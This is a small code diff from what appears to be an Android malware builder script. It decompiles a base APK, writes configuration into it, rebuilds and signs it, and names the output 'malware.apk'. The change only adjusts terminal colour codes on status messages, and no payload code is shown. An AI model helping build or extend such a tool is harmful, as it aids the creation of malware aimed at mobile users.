@@ -32,9 +32,9 @@ class builder:
         self.shell("apktool d src/base_mod.apk")
         print(f"{self.info} {self.color.GREEN}Configure apk{self.color.NONE}")
         self.CommandWriter(path)
-        print(f"{self.info} {self.color.GREEN}Recompile apk{self.color.NONE}")
+        print(f"{self.info} {self.color.GREEN}Recompile apk{self.color.NONE}\033[93m")
         self.rebuild()
-        print(f"{self.info} {self.color.GREEN}Signing apk{self.color.NONE}")
+        print(f"\033[0m{self.info} {self.color.GREEN}Signing apk{self.color.NONE}")
         self.signapk()
         print(f"{self.info} {self.color.GREEN}apk name malware.apk{self.color.NONE}")
 
